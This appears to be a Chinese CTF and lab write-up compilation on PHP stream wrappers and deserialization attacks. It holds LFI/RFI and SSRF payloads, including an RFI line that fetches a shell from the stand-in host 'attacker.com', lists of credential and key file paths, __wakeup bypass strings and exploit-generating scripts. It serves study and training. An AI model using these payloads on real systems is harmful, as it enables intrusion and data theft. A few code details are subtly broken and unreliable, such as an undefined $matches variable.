---
title: PHP伪协议与反序列化利用
description: 系统梳理 PHP 伪协议（php://filter、php://input、data://、file://、gopher:// 等）利用技巧，深度解析反序列化漏洞中
  __wakeup 绕过（对象计数不匹配）、正则过滤数字绕过（+ 前缀）、base64 编码差异导致的利用细节。补充 SSRF 场景下 file:// 本地文件读取、gopher://
  发送原始 TCP 数据包攻击 FastCGI/Redis、双重 URL 编码绕过解析机制及多种绕过技巧。结合赣网杯2020、攻防世界 unserialize3
  与 Web_php_unserialize、CTFHUB SSRF 靶场实战题目完善利用链，并新增 Pikachu 靶场 PHP 反序列化漏洞实战复现案例。本次更新整合
  BUUCTF 实战题目（WarmUp、include1、Secret File、nizhuansiwei、php、facebook、ZJCTF、easy_serialize_php、PHPWEB、had
  a had day 等）的详细利用链与绕过细节，并补充 Java 反序列化特征识别与 XXE 漏洞利用、绕过、修复方案。新增文件包含场景下伪协议实战细节（php://filter
  读取源码、php://input 执行代码、data:// 绕过、file:// 读取敏感文件、远程包含绕过），并交叉引用 php-file-inclusion-vulnerability.md。
category: program-analysis
tags:
- PHP
- 伪协议
- 反序列化
- __wakeup
- __toString
- CTF
- 文件读取
- 绕过技巧
- 攻防世界
- SSRF
- gopher
- FastCGI
- Redis
- 双重URL编码
- Pikachu
- 对象注入
- 魔术方法
- BUUCTF
- 对象逃逸
- PHAR反序列化
- Java反序列化
- XXE
- ysoserial
- Base64
- UTF-16BE
- 文件包含
- LFI
- RFI
- php://filter
- php://input
- data://
date: '2020-10-01'
updated: '2026-11-14'
---
## 概述

本页面系统梳理 PHP 常见伪协议的特性与利用条件，重点分析如何结合 `php://filter` 读取源码、`php://input` 与 `data://` 绕过文件内容校验，以及如何利用 `__toString`、`__wakeup` 等魔术方法配合反序列化实现任意文件读取或代码执行。同时深入覆盖 **SSRF（服务端请求伪造）** 场景下的伪协议利用：`file://` 读取本地文件、`gopher://` 构造原始 TCP 报文攻击内网服务（FastCGI、Redis）、双重 URL 编码绕过解析机制、以及 Userinfo、十六进制 IP、302 跳转、DNS 重绑定等绕过技巧。**文件包含漏洞场景**下的伪协议实战细节（本地/远程包含、目录穿越、截断绕过、敏感文件路径）亦在本页详述。内容基于 **赣网杯2020**、**攻防世界（Attack-Defense World）高手进阶区**、**CTFHUB SSRF 靶场**、**Pikachu 靶场**、**BUUCTF** 及 **XD安全 Day31-39 学习笔记** 实战题目复现，归档自 [[007攻防实验室]] 微信公众号文章及 [[attack-defense-world-master-advanced-writeup]]、[[ssrf-ctf-exploitation-guide]]、[[pikachu-target-writeup-part5]]、[[xd-security-file-inclusion-notes]] 相关题解。

**本次更新**整合了 **XD安全 Day37-39 学习笔记**，补充了 PHP 序列化字符串格式的细节（整型 `i:value`）、Java 反序列化的特征识别（`rO0AB`/`aced`）、`ysoserial` 工具链使用、以及 XXE 漏洞的利用姿势（文件读取、内网探测、盲注带外数据外带、UTF-16BE 编码绕过、外部 DTD 攻击）及修复方案。新增 **文件包含漏洞专题交叉引用** 指向 [[php-file-inclusion-vulnerability]]，形成完整知识体系。

---

## PHP 常见伪协议速查

> 官方文档：[PHP 封装协议](https://www.php.net/manual/zh/wrappers.php)

| 协议 | 作用 | 关键条件 | 典型 Payload 示例 | 文件包含/SSRF 适用性 |
| :--- | :--- | :--- | :--- | :--- |
| **file://** | 访问本地文件系统 | 默认开启 | `file:///etc/passwd`、`file:///var/www/html/flag.php` | LFI 读取源码/敏感文件；SSRF 读取本地文件 |
| **php://filter** | 读取文件并转换编码（如 Base64） | 默认开启 | `php://filter/read=convert.base64-encode/resource=index.php` | LFI 读取源码不执行；SSRF 读取源码 |
| **php://input** | 读取 POST 请求原始数据体 | `allow_url_include=On` | `?file=php://input` (POST: `<?php phpinfo();?>`) | LFI/RFI 执行 POST 代码；需包含函数支持 |
| **data://** | 将数据作为文件流读取 | `allow_url_include=On` <br> `allow_url_fopen=On` <br> PHP>=5.2.0 | `data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b` | LFI/RFI 注入可控字符串；绕过内容校验 |
| **zip://** | 读取压缩包内文件 | 默认开启 | `zip://path/to/img.jpg%23shell.php` | LFI 结合文件上传 Getshell |
| **zlib://** | 读取压缩流 | 默认开启 | `compress.zlib://path/to/file` | LFI 读取压缩文件 |
| **gopher://** | 发送原始 TCP 数据包（SSRF 利用核心） | `allow_url_fopen=On` <br> 支持 TCP 流式传输 | `gopher://127.0.0.1:9000/_POST%20/flag.php...` | SSRF 攻击内网 FastCGI/Redis/MySQL 等 |
| **dict://** | 字典服务协议（端口探测/数据外带） | 默认开启 | `dict://127.0.0.1:6379/info` | SSRF 内网端口探测、Redis 攻击 |
| **ldap://** | LDAP 协议（较少用） | 需扩展支持 | `ldap://127.0.0.1:389/...` | SSRF 特定场景 |
| **phar://** | PHAR 归档文件访问（触发反序列化） | `phar.readonly=Off` (生成时) | `phar:///path/to/archive.phar` | 文件操作函数触发反序列化 (POP 链) |

> **注意**：`include/require` 等包含函数受 `allow_url_include` 影响；`file_get_contents/fopen/curl` 等读取函数受 `allow_url_fopen` 影响。SSRF 场景多依赖 `curl`、`file_get_contents`、`fopen` 等支持远程协议的函数。**文件包含漏洞成因核心：可控变量 + 文件包含函数**，详见 [[php-file-inclusion-vulnerability]]。

---

## 文件包含漏洞场景下的伪协议实战细节

> 来源：[[xd-security-file-inclusion-notes]] (XD安全 Day31-32 学习笔记)、[[php-file-inclusion-vulnerability]]

### 危险函数差异与利用前提

| 函数 | 出错行为 | 利用价值 |
| :--- | :--- | :--- |
| `include()` | 警告，继续执行 | 最常见，适合包含后继续执行后续逻辑 |
| `include_once()` | 警告，只包含一次 | 需注意重复包含导致类重定义报错 |
| `require()` | 致命错误，终止执行 | 若包含失败会中断利用链 |
| `require_once()` | 致命错误，只包含一次 | 同上 |

**核心配置检测**：利用前必通过 `phpinfo()` 或报错回显确认 `allow_url_fopen` 与 `allow_url_include` 状态。
- `allow_url_fopen=On`：支持 `file_get_contents`、`fopen` 等读取远程资源（SSRF、data://、php://filter 读取）。
- `allow_url_include=On`：支持 `include/require` 包含远程资源（RFI、php://input 执行代码）。

### php://filter：读取源码绕过执行

**核心用法**：`php://filter/read=convert.base64-encode/resource=<目标文件>`
- **作用**：将目标文件内容 Base64 编码后输出，**防止 PHP 解析器直接执行代码**，从而获取源码。
- **适用场景**：
  1.  **文件包含 (LFI)**：`include($_GET['file'])` 时，直接包含 `index.php` 会执行代码导致无法看到源码或报错；用 filter 编码后可安全读取。
  2.  **SSRF (`file_get_contents`/`curl`)**：读取内网 Web 服务源码。
  3.  **获取类定义**：反序列化利用前，必须读取目标类源码以构造正确 Payload（属性名、修饰符、命名空间）。

**实战案例 (XD安全笔记 - bugku)**：
```text
# 目标：http://123.206.87.240:8005/post/index.php?file=show.php
# Payload 读取 index.php 源码：
http://123.206.87.240:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php
# 返回 Base64 字符串，解码后在注释中发现 flag
```

**实战案例 (赣网杯2020 / Pikachu / BUUCTF nizhuansiwei)**：
```text
# 读取 useless.php 获取 Flag 类定义
?file=php://filter/read=convert.base64-encode/resource=useless.php
# 解码后得到：
# class Flag { public $file; public function __tostring(){ if(isset($this->file)) echo file_get_contents($this->file); } }
```

**进阶过滤器链**：
- `convert.base64-decode`：解码 Base64 文件内容。
- `convert.rot13`：ROT13 编码/解码。
- `string.toupper` / `string.tolower`：大小写转换（可用于绕过大小写敏感过滤）。
- 多重编码：`php://filter/read=convert.base64-encode|convert.base64-encode/resource=...` (双重 Base64)。

### php://input：POST 数据直接执行代码

**核心用法**：`?file=php://input` 配合 POST Body 发送 PHP 代码。
- **前置条件**：`allow_url_include=On`（必须，因为 `include/require` 才会执行流内容）。
- **利用场景**：
  1.  **RFI 执行代码**：目标存在 `include($_GET['file'])`，且无文件上传点，可直接 POST Webshell 代码执行。
  2.  **绕过文件内容校验**：如赣网杯2020 题目需 `file_get_contents($sz_txt) === "welcome to jxsz"`，可用 `php://input` POST 该字符串满足校验，同时 `include` 执行 POST 体代码（需注意同一请求无法同时满足 GET 参数和 POST Body 被 `include` 读取两次，通常分步或配合 `data://`）。

**实战案例 (赣网杯2020 变种)**：
```http
GET /?sz_txt=php://input&sz_file=useless.php&password=... HTTP/1.1
POST Body: welcome to jxsz
```
> 注：若同一参数既用于 `file_get_contents` 校验又用于 `include`，`php://input` 只能读取一次，第二次为空。此时需改用 `data://` 协议绕过校验，`include` 真实文件。

### data://：注入可控字符串绕过校验

**核心用法**：`data://text/plain;base64,<Base64编码内容>`
- **前置条件**：`allow_url_include=On` 且 `allow_url_fopen=On`，PHP >= 5.2.0。
- **优势**：支持 GET 请求完成“注入字符串+包含执行”，无需 POST，适合只能控制 URL 参数的场景。
- **利用场景**：
  1.  **绕过内容校验**：将需匹配的字符串 Base64 编码放入 `data://`，满足 `file_get_contents` 等函数的比较逻辑。
  2.  **直接执行代码**：`data://text/plain,<?php phpinfo();>` (需 URL 编码) 或 Base64 版本。

**实战案例 (赣网杯2020 标准解法)**：
```text
# 校验 sz_txt 内容为 "welcome to jxsz"
# Base64: d2VsY29tZSB0byBqeHN6
?sz_txt=data://text/plain;base64,d2VsY29tZSB0byBqeHN6
```

**实战案例 (XD安全笔记 - nizhuansiwei 类题目)**：
```text
?text=data://text/plain,welcome to the zjctf
# 或 Base64 版
?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgeGpjdGY=
```

### file://：SSRF 与 LFI 读取本地敏感文件

**核心用法**：`file:///absolute/path/to/file`
- **LFI 场景**：`include` 参数直接传入 `file:///etc/passwd` 读取文件内容（若回显位置允许）。
- **SSRF 场景**：`file_get_contents($_GET['url'])` 等函数支持 `file://` 协议，直接读取服务器本地任意文件。
- **敏感文件路径速查 (来源：XD安全笔记)**：

**Windows 敏感路径**：
```
C:\boot.ini                    # 系统版本
C:\Windows\System32\inetsrv\MetaBase.xml  # IIS 配置
C:\Windows\repair\sam          # 系统初次安装密码
C:\Program Files\mysql\my.ini  # MySQL 配置
C:\Program Files\mysql\data\mysql\user.MYD # MySQL root
C:\Windows\php.ini             # PHP 配置
C:\Windows\my.ini              # MySQL 配置
C:\Windows\win.ini             # 系统基础配置
```

**Linux 敏感路径**：
```
/etc/passwd                    # 用户列表
/etc/shadow                    # 密码哈希 (需 root)
/root/.ssh/id_rsa              # SSH 私钥
/root/.ssh/authorized_keys     # 授权公钥
/root/.bash_history            # 历史命令
/root/.mysql_history           # MySQL 历史命令
/usr/local/app/php5/lib/php.ini # PHP 配置
/etc/my.cnf                    # MySQL 配置
/etc/httpd/conf/httpd.conf     # Apache 配置
/proc/self/cmdline             # 当前进程命令行
/proc/mounts                   # 挂载设备
/var/lib/mlocate/mlocate.db    # 全文件路径数据库
```

**实战案例 (CTFHUB SSRF - 文件读取)**：
```text
?url=file:///var/www/html/index.php   # 读取源码发现 flag.php 路径
?url=file:///var/www/html/flag.php    # 直接读取 Flag
```

### 远程文件包含 (RFI) 与绕过

**条件**：`allow_url_include=On`。
**标准利用**：攻击者 VPS 放置 `shell.txt` (内容为 PHP 代码)，目标请求 `?file=http://attacker.com/shell.txt`。
**绕过限制技巧 (参考文件上传绕过思路，来源：XD安全笔记)**：
1.  **协议封装**：`data://`、`php://input` 替代远程 HTTP。
2.  **截断绕过 (旧版 PHP < 5.3.4 / 特定配置)**：`%00` 截断后缀 `.php` -> `?file=http://attacker.com/shell.txt%00`。
3.  **路径长度截断 (Windows 特性)**：Windows 文件名长度限制 (260 字符)，构造超长路径截断后缀。
4.  **`. ` 或 `..` 绕过**：利用 `include("./".$_GET['file'])` 结构，`file=..%2f..%2f..%2fetc%2fpasswd` 目录穿越。
5.  **通配符/别名绕过**：Apache `Alias`、`open_basedir` 绕过技巧。

> 详细文件包含漏洞成因、四大危险函数差异、目录穿越与截断绕过、任意文件下载漏洞检测逻辑及完整敏感路径清单，见 [[php-file-inclusion-vulnerability]]。

---

## 序列化字符串格式解析

> 来源：XD安全 Day37 学习笔记

PHP `serialize()` 输出的字符串遵循特定的类型标识符与长度/值格式，理解该格式是构造手工 Payload、绕过正则过滤（如 `Web_php_unserialize` 中的 `+` 号绕过）的基础。

| 类型 | 标识符 | 格式示例 | 说明 |
| :--- | :--- | :--- | :--- |
| **整型** | `i` | `i:19;` | **无需双引号，无需长度声明**，直接值。 |
| **浮点型** | `d` | `d:1.23;` | 同整型。 |
| **布尔型** | `b` | `b:1;` / `b:0;` | 值为 1 或 0。 |
| **空值** | `N` | `N;` | 无值部分。 |
| **字符串** | `s` | `s:9:"xiaodi123";` | 长度为字节数，含双引号。 |
| **数组** | `a` | `a:2:{i:0;s:3:"abc";i:1;i:123;}` | 键值对序列，键可为整型/字符串。 |
| **对象** | `O` | `O:4:"User":2:{s:4:"name";s:5:"admin";s:3:"age";i:20;}` | `类名长度:"类名":属性数:{属性序列化}`。 |
| **引用** | `R` / `r` | `R:1;` / `r:1;` | 引用变量/对象。 |

**关键细节**：
- 对象属性若为 `private`，序列化名为 `\00ClassName\00prop`（含两个空字节，长度计算需包含）；
- 若为 `protected`，名为 `\00*\00prop`；
- **整型数值不带引号和长度**，这是手工修改 Payload 时常见的错误点（如误写为 `i:2:"19";`）。

---

## 反序列化魔术方法利用链对比

| 魔术方法 | 触发时机 | 核心利用条件 | 典型绕过/利用点 | 本文涉及题目 |
| :--- | :--- | :--- | :--- | :--- |
| **`__wakeup`** | `unserialize()` 成功后 | 类定义中存在 `__wakeup` 且有防御逻辑 | **对象属性计数不匹配** (声明 > 实际) 绕过执行 | `unserialize3`, `Web_php_unserialize`, BUUCTF `php` |
| **`__toString`** | 对象作为字符串使用 (`echo`/拼接) | 代码中直接 `echo $obj` 或字符串拼接 | 控制属性进入 `file_get_contents` / SQL / `file_put_contents` | 赣网杯2020, Pikachu, BUUCTF `nizhuansiwei`, `ZJCTF` |
| **`__destruct`** | 对象销毁 (脚本结束/引用计数为0) | 无特殊条件，最通用触发点 | 文件操作、命令执行、链式调用起点 | `Web_php_unserialize`, BUUCTF `PHPWEB` |
| **`__construct`** | 对象创建 (`new`) | 反序列化**不触发** (仅 `new` 触发) | 仅用于本地生成 Payload 时初始化属性 | 本地 EXP 脚本 |
| **`__sleep`** | `serialize()` 之前 | 可控制序列化哪些属性 | 隐藏敏感属性、配合 `__wakeup` 逻辑 | - |
| **`__call`/`__callStatic`** | 调用不可访问方法时 | 存在动态方法调用 | 链式调用起点、 POP 链构造 | PHAR 反序列化链 |

---

## 实战复现一：赣网杯2020 PHP 题目（`__toString` 利用链）

### 题目代码审计

```php
<?php
$sz_txt = $_GET["sz_txt"];
$sz_file = $_GET["sz_file"];
$password = $_GET["password"];

if(isset($sz_txt) && (file_get_contents($sz_txt, 'r') === "welcome to jxsz")){
    echo "<br><h1>".file_get_contents($sz_txt, 'r')."</h1></br>";
    if(preg_match("/flag/", $sz_file)){
        echo "Not now!";
        exit();
    }else{
        include($sz_file); // 提示 useless.php
        $password = unserialize($password);
        echo $password;
    }
}else{
    highlight_file(__FILE__);
}
?>
```

**逻辑梳理**：
1.  **校验点**：`sz_txt` 指向的内容必须完全等于 `"welcome to jxsz"`。
2.  **过滤点**：`sz_file` 不能包含 "flag" 字符串。
3.  **包含点**：包含 `sz_file` (需引入类定义文件 `useless.php`)。
4.  **触发点**：反序列化 `password` 并直接 `echo`，触发 `__toString` 魔术方法。

### 步骤一：绕过内容校验 (构造 "welcome to jxsz")

利用伪协议让 `file_get_contents` 读取可控输入流。

#### 方案 A：`php://input` (需 POST 请求)
*   **条件**：`allow_url_include=On` (题目存在 `include` 且成功，推测开启)。
*   **操作**：GET 参数 `sz_txt=php://input`，POST Body 发送 `welcome to jxsz`。

#### 方案 B：`data://` (推荐，仅需 GET)
*   **条件**：`allow_url_include=On` 且 `allow_url_fopen=On`。
*   **操作**：Base64 编码 `"welcome to jxsz"` -> `d2VsY29tZSB0byBqeHN6`。
*   **Payload**：
    ```text
    ?sz_txt=data://text/plain;base64,d2VsY29tZSB0byBqeHN6
    ```

### 步骤二：读取类定义源码 (`useless.php`)

题目过滤了 `flag` 关键词，注释提示包含 `useless.php`。利用 `php://filter` 读取源码并 Base64 编码输出，避免 PHP 解析执行。

*   **Payload**：
    ```text
    sz_file=php://filter/read=convert.base64-encode/resource=useless.php
    ```
*   **解码后源码**：
    ```php
    <?php
    class Flag{
        public $file;
        public function __tostring(){
            if(isset($this->file)){
                echo file_get_contents($this->file);
                echo "<br>";
                return ("So cool,continue plz");
            }
        }
    }
    ?>
    ```

### 步骤三：构造反序列化利用链 (`__toString` -> 任意文件读取)

**漏洞原理**：
1.  `unserialize($password)` 还原对象。
2.  `echo $password` 将对象作为字符串输出，自动调用 `__toString()`。
3.  `__toString()` 中执行 `file_get_contents($this->file)`，可控 `$file` 属性实现任意文件读取。

**EXP 构造脚本**：
```php
<?php
class Flag{
    public $file = "flag.php"; // 目标文件
    public function __tostring(){
        if(isset($this->file)){
            echo file_get_contents($this->file);
            echo "<br>";
            return ("So cool,continue plz");
        }
    }
}
$password = new Flag();
echo serialize($password);
// 输出: O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
?>
```

**最终综合 Payload** (需同时满足三个参数)：
```text
?sz_txt=data://text/plain;base64,d2VsY29tZSB0byBqeHN6
&sz_file=useless.php                     // 必须包含类定义文件
&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

> **关键点**：`sz_file` 必须为 `useless.php` (或包含 Flag 类定义的文件)，否则反序列化时找不到类定义报错 (`__PHP_Incomplete_Class`)，无法触发 `__toString`。

---

## 实战复现二：Pikachu 靶场 PHP 反序列化漏洞

> 来源：[[pikachu-target-writeup-part5]]、无名安全团队归档文章《pikachu靶场&目录遍历&信息泄露&反序列化&XXE&重定向&SSRF(五)》。

### 漏洞代码分析

Pikachu 靶场反序列化关卡核心代码如下：

```php
// 接收 POST 参数 'o'
if(isset($_POST['o'])){
    $s = $_POST['o'];
    // 反序列化用户输入
    if(!@$unser = unserialize($s)){
        echo "<p>大兄弟,来点劲爆点儿的!</p>";
    }else{
        // 直接输出对象属性，触发 __toString
        echo "<p>{$unser->test}</p>";
    }
}
```

**漏洞点**：
1.  `unserialize()` 直接处理用户可控输入 `$_POST['o']`，无任何过滤。
2.  反序列化后直接在字符串上下文中输出对象属性 `{$unser->test}`，若对象实现了 `__toString()` 将自动调用。

### 魔术方法利用原理

PHP 反序列化漏洞核心在于**魔术方法**的自动触发。常见魔术方法及触发时机见上表。

### 实战利用步骤

#### 本地构造恶意序列化字符串

```php
<?php
class S{
    public $test = "pikachu";
    // 可选：实现 __toString 进一步利用
    public function __toString(){
        return $this->test;
    }
}

$obj = new S();
// 修改属性值为 XSS Payload 或文件读取路径
$obj->test = "<script>alert('xss')</script>";
// 或: $obj->test = file_get_contents("/etc/passwd"); (需配合其他魔术方法)

echo serialize($obj);
// 输出: O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}
?>
```

#### 发送 Payload

*   **POST 请求**：`o=O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}`
*   **效果**：页面回显 `<p><script>alert('xss')</script></p>`，触发 XSS。

#### 进阶利用：结合 `__toString` 读取文件

若目标类定义如下：
```php
class Flag{
    public $file;
    public function __toString(){
        if(isset($this->file)){
            return file_get_contents($this->file);
        }
    }
}
```

构造 Payload：
```php
<?php
class Flag{
    public $file = "flag.php";
}
echo serialize(new Flag());
// O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
?>
```

发送 `o=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}` 即可读取 Flag。

> **关键要求**：目标环境必须已加载 `Flag` 类定义（通过 `include/require` 或自动加载），否则反序列化产生 `__PHP_Incomplete_Class` 无法触发魔术方法。

---

## 实战复现三：攻防世界 `unserialize3`（`__wakeup` 绕过——对象计数不匹配）

> 来源：[[attack-defense-world-master-advanced-writeup]] 中的 `unserialize3` 题目。

### 核心原理：`__wakeup` 绕过 (CVE-2016-7124 类似机制)

当 `unserialize()` 处理序列化字符串时，会先解析对象属性个数（冒号后的数字，如 `O:4:"Class":1:{...}` 中的 `1`）。如果声明的属性个数 **大于** 实际序列化字符串中包含的属性个数，PHP 会**跳过** `__wakeup()` 方法的调用，直接创建对象。这是绕过 `__wakeup` 中重置属性、抛出异常等防御逻辑的关键技巧。

### 题目代码逻辑 (推测)

```php
class xctf {
    public $flag = '111';
    function __wakeup() {
        $this->flag = '111'; // 重置 flag，阻止读取敏感文件
    }
}
$password = unserialize($_GET['password']);
```

### 利用步骤

1.  **正常序列化输出**：
    `O:4:"xctf":1:{s:4:"flag";s:3:"111";}`
2.  **修改对象属性计数**：将 `1` 改为 `3` (或任意大于实际属性数的值)。
    `O:4:"xctf":3:{s:4:"flag";s:3:"111";}`
3.  **构造恶意属性值**：将 `flag` 属性值修改为目标文件路径（如 `flag.php`），并调整长度 `s:8:"flag.php"`。
    `O:4:"xctf":3:{s:4:"flag";s:8:"flag.php";}`

### 最终 Payload
```text
?password=O:4:"xctf":3:{s:4:"flag";s:8:"flag.php";}
```
**效果**：`__wakeup` 未执行，`$this->file` 保持为 `flag.php`，后续逻辑（如 `__destruct` 或 `__toString`）读取 Flag。

---

## 实战复现四：攻防世界 `Web_php_unserialize`（综合绕过链：`__wakeup` + 正则绕过 + Base64 差异）

> 来源：[[attack-defense-world-master-advanced-writeup]] 中的 `Web_php_unserialize` 题目。

该题目综合考察了三个关键绕过点，是反序列化利用链构造的经典案例。

### 题目代码审计 (关键片段)

```php
<?php
// ... 前置代码 ...
$var = $_GET['var'];

// 1. 正则过滤数字
if (preg_match('/\d+/', $var)) {
    die("No numbers allowed!");
}

// 2. Base64 解码后反序列化
$data = base64_decode($var);
$obj = unserialize($data);

// ... 后续触发点 (如 __destruct 调用 highlight_file) ...
?>
```

### 绕过点一：正则过滤数字绕过（`+` 前缀）

*   **过滤规则**：`preg_match('/\d+/', $var)` 禁止出现数字字符 `0-9`。
*   **序列化格式痛点**：PHP 序列化字符串 **必须** 包含数字（对象属性计数、字符串长度、整数值等），如 `O:4:"Demo":1:{s:4:"file";s:8:"flag.php";}` 中的 `4`, `1`, `4`, `8`。
*   **绕过技巧**：PHP 在解析序列化字符串时，支持 **`+` 号前缀的整数** (如 `:+4`, `:+1`, `:+8`)。
*   **操作**：将序列化字符串中所有的数字 `N` 替换为 `+N`。
    *   原：`O:4:"Demo":1:{s:4:"file";s:8:"flag.php";}`
    *   绕过后：`O:+4:"Demo":+1:{s:+4:"file";s:+8:"flag.php";}`

### 绕过点二：`__wakeup` 绕过（对象计数不匹配）

*   **防御代码**：
    ```php
    function __wakeup() {
        if ($this->file != 'index.php') {
            $this->file = 'index.php'; // 重置文件名
        }
    }
    ```
*   **利用方式**：同 `unserialize3`，修改对象声明的属性计数大于实际属性数。
*   **结合绕过点一**：计数数字也需加 `+` 号。
    *   修改前：`O:+4:"Demo":+1:{...}`
    *   修改后：`O:+4:"Demo":+2:{s:+4:"file";s:+8:"flag.php";}` (声明 2 个属性，实际只有 1 个)

### 绕过点三：Base64 编码差异（本地生成 vs 在线工具/手工替换）

*   **现象**：直接对修改后的序列化字符串进行 `base64_encode` 可能因特殊字符（如 `:+`、花括号、分号、引号）在不同环境（在线工具、PHP `serialize()` 函数、手工字符串拼接）下产生 **不可见字符、空格、换行符差异**，导致解码后反序列化失败（报错 `unserialize(): Error at offset...`）。
*   **根因**：
    1.  在线 Base64 编码工具可能对输入字符串进行 `trim()` 或 URL 编码处理。
    2.  PHP `serialize()` 生成的字符串包含精确的长度计算，手工修改长度极易出错。
    3.  `:+` 这种非标准序列化格式虽然 PHP 解析器接受，但部分库可能不支持生成。
*   **最佳实践（本地化脚本生成）**：
    编写本地 PHP 脚本，**通过代码逻辑构造对象、修改属性、序列化、字符串替换、Base64 编码**，保证字节级一致性。

**本地 EXP 生成脚本**：
```php
<?php
class Demo {
    private $file = 'index.php'; // 需与目标类定义一致 (包括访问修饰符 private/protected/public)
    
    public function __construct($file) {
        $this->file = $file;
    }
    
    function __destruct() {
        echo @highlight_file($this->file, true);
    }
    
    function __wakeup() {
        if ($this->file != 'index.php') {
            $this->file = 'index.php';
        }
    }
}

// 1. 实例化对象，设置目标文件
$obj = new Demo('fl4g.php');

// 2. 序列化
$a = serialize($obj);
// 输出示例: O:4:"Demo":1:{s:14:"\00Demo\00file";s:8:"fl4g.php";} (注意私有属性序列化时会包含 \00Demo\00file)

// 3. 代码级替换：绕过数字正则 (\d+) -> 加 + 号
// 注意：私有属性名序列化格式为 s:13:"\00Demo\00file"，长度计数也需修改
$b = str_replace([':1:', ':4:', ':8:', ':13:'], [':+1:', ':+4:', ':+8:', ':+13:'], $a);
// 更稳健的正则替换所有数字 (除非数字在字符串内容中，但此处文件名无数字)
$b = preg_replace('/(?<!:):(\d+)/', ':+$1', $a); // 简略示例，实际需精确匹配格式字段

// 4. 绕过 __wakeup：修改对象属性计数 (O:4:"Demo":1 -> O:4:"Demo":+2)
// 假设原属性计数为 1
$b = preg_replace('/(O:\+\d+:"Demo":)\+(\d+)/', '$1+'.($matches[2]+1), $b); // 计数+1

// 5. Base64 编码输出
echo "Raw Serialized: " . $b . "\n";
echo "Base64 Payload: " . base64_encode($b) . "\n";
?>
```

> **关键细节**：
> *   **属性访问修饰符**：目标类如果是 `private $file`，序列化时属性名会变为 `\00ClassName\00file` (长度含两个空字节)，替换长度时必须精确计算。建议本地定义 **完全一致的类结构** 让 PHP 引擎自动计算长度。
> *   **空格与换行**：`base64_encode` 输出无换行，直接用于 URL 参数需 `urlencode` (处理 `+`, `/`, `=`)。

### 最终攻击流程

1.  本地运行上述脚本获取 `Base64 Payload`。
2.  URL 编码 Payload (特别是 `+` 号变 `%2B`, `/` 变 `%2F`, `=` 变 `%3D`)。
3.  请求目标：`http://target/?var=<URL_Encoded_Base64_Payload>`。
4.  触发 `__destruct` (脚本结束) -> 读取 `fl4g.php` 内容高亮输出。

---

## 实战复现五：BUUCTF `WarmUp` (PHP 反序列化 + 文件包含)

> 来源：归档文章 BUUCTF Web 部分刷题分享。

### 题目代码片段

```php
<?php
// ... 省略部分代码 ...
class emmm {
    public static function checkFile(&$page) {
        $whitelist = ["source"=>"source.php","hint"=>"hint.php"];  // 可知 flag 位于 source.php
        // ... 过滤逻辑 ...
    }
    // ...
}
$password = unserialize($password);  // 反序列化入口
echo $password;  // 触发 __toString
?>
```

### 利用思路

1.  通过伪协议 `php://filter/read=convert.base64-encode/resource=source.php` 读取源码获取类定义。
2.  构造包含 `__toString` 魔术方法的对象，在 `__toString` 中调用 `file_get_contents` 读取 `flag.php` (或 `source.php` 查看源码再读取 flag)。
3.  利用 `php://input` 或 `data://` 绕过前置校验 (若存在)。

**关键 Payload 示例**：
```php
<?php
class Flag {
    public $file = "flag.php";
    public function __toString() {
        return file_get_contents($this->file);
    }
}
echo serialize(new Flag());
// O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
?>
```

---

## 实战复现六：BUUCTF `include1` / `[极客大挑战 2019]Secret File` (伪协议文件读取)

### `include1` 利用

直接使用 `php://filter` 读取 `flag.php` 源码：
```text
?file=php://filter/read=convert.base64-encode/resource=flag.php
```
Base64 解码即得 Flag。

### `Secret File` 利用

题目存在文件包含参数，利用 `php://filter` 读取源码，发现 flag 在 `flag.php` 中，再次利用伪协议读取。

---

## 实战复现七：BUUCTF `nizhuansiwei` (PHP 文件包含伪协议 + 反序列化)

> 归档文章中的 `nizhuansiwei` 题目。

### 题目代码逻辑

```php
<?php
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!"; exit();
    }else{
        include($file);  // useless.php
        echo $password;  // 反序列化后直接输出，触发 __toString
    }
}else{
    highlight_file(__FILE__);
}
?>
```

### 利用步骤

1.  **绕过 `text` 校验**：使用 `data://` 协议
    ```text
    text=data://text/plain,welcome to the zjctf
    ```
2.  **读取类定义**：`file=php://filter/read=convert.base64-encode/resource=useless.php`
    解码得到：
    ```php
    class Flag{
        public $file;
        public function __tostring(){
            if(isset($this->file)){
                echo file_get_contents($this->file);
                echo "<br>";
                return ("U R SO CLOSE !///COME ON PLZ");
            }
        }
    }
    ```
3.  **构造反序列化 Payload**：
    ```php
    <?php
    class Flag{
        public $file = "flag.php";
    }
    echo serialize(new Flag());
    // O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
    ```
4.  **最终请求**：
    ```text
    ?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
    ```

---

## 实战复现八：BUUCTF `php` (备份文件泄露 + `__wakeup` 绕过)

### 题目源码 (通过 `php~` 或 `php.bak` 获取)

```php
<?php
include 'flag.php';
error_reporting(0);
class Name {
    private $username = 'nonono';
    private $password = 'yesyes';
    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }
    function __wakeup(){
        $this->username = 'guest';
    }
    function __destruct(){
        if ($this->password != 100) {
            die("NO!!!hacker!!!");
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            die("hello my friend~~ sorry i can't give you the flag!");
        }
    }
}
?>
```

### 利用难点

1.  **私有属性序列化格式**：`private $username` 序列化为 `s:14:"\00Name\00username"` (含两个空字节)。
2.  **`__wakeup` 重置 username**：需绕过 `__wakeup`。

### 绕过技巧

*   **对象计数不匹配**：将属性计数从 `2` 改为 `3`，跳过 `__wakeup`。
*   **属性值修改**：`username` 设为 `admin`，`password` 设为 `100` (整型)。

### 本地生成 Payload

```php
<?php
class Name {
    private $username = 'admin';
    private $password = 100;
}
